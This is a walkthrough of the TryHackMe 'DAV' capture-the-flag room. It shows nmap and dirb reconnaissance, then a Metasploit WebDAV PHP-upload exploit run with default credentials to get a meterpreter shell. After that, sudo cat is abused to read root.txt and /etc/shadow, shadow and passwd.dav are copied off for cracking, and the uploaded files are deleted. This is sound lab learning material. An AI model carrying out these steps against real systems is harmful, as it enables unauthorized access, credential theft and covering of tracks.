A walkthrough of my process in completing the DAV room on TryHackMe

WALKTHROUGH

Begin with reconnaissance
  ──(kali㉿kali)-[~]
  └─$ nmap -sV -sC -A -T4 <TARGETIP>
  ...
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-title: Apache2 Ubuntu Default Page: It works
  |_http-server-header: Apache/2.4.18 (Ubuntu)

Looks like we're jsut dealing with a web page for now

Run dirb to enumerate the page for hidden directories with vulnerabilities
  ──(kali㉿kali)-[~]
  └─$ sudo dirb http://<TARGETIP> -w /usr/share/wordlists/dirb/vulns/apache.txt 

While it's running, access the page via browser
  Apache default page

Let's check for additional open ports while dirb is scanning
  ┌──(kali㉿kali)-[~]
  └─$ nmap -sV -p- -T4 --min-rate=5000 <TARGETIP>
    No yield

Let's race nmap against dirb and compare outputs (spoiler, it's way faster but less thorough); better for this activity in my opinion
  ┌──(kali㉿kali)-[~]
  └─$ nmap -sV --script=http-enum -A -T4 <TARGETIP>    
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    | http-enum: 
    |_  /webdav/: Potentially interesting folder (401 Unauthorized)

      dirb output for reference 
        ---- Scanning URL: http://<TARGETIP>/ ----
        + http://<TARGETIP>/index.html (CODE:200|SIZE:11321)                     
        + http://<TARGETIP>/server-status (CODE:403|SIZE:301)                    
        + http://<TARGETIP>/webdav (CODE:401|SIZE:460)                           
                                                      
Navigate to hidden page, met with login form
  http://<TARGETIP>/webdav

Boot up burpsuite to analyse GET request and POST returns for username and password submission
  Username and password are paired and encoded in base64
  Brute force doesn't seem like the most efficient strategy 
  Change course

Boot up metasploit and search for webdav crendential
  One result
     #  Name                                          Disclosure Date  Rank       Check  Description
     -  ----                                          ---------------  ----       -----  -----------
     0  exploit/windows/http/xampp_webdav_upload_php  2012-01-14       excellent  No     XAMPP WebDAV PHP Upload 

Check module options and identify default credentials
Set options as necessary and return to browser
    RHOSTS - <TARGETIP>
    LHOSTS - <ATTACKMACHINE>
  
Use default credentials to login to webdav via popup on <TARGETIP>/webdav

Run metasploit exploit and refresh page
  This uploads a php file that will provide us access to the system via the terminal

Open file uploaded to webdav and get a meterpreter session in metasploit

Navigate through file heirarchy to find directory for user 'merlin'
  cat user.txt
    [flag 1]

From here, I create a shell so I can check my uid and sudo privileges
  meterpreter > shell
  Process 881 created.
  Channel 3 created.
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  sudo -l
  Matching Defaults entries for www-data on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User www-data may run the following commands on ubuntu:
      (ALL) NOPASSWD: /bin/cat

Great! I can use sudo cat to view any file in the system I know the path of without a password, even if it's in a folder I don't have access to
Since I know the name of the file I'm looking for finding the second flag is quick work
  sudo cat /root/root.txt
  [flag 2]

Challenge completed!

Then just to be thorough
  sudo cat /etc/shadow
    Copy and paste into a new file on my machine
      Save for hash cracking practice later
  Navigate back to wampp directory
    Remove .php files uploaded by metasploit
    Exfiltrate passwd.dav file for cracking practice
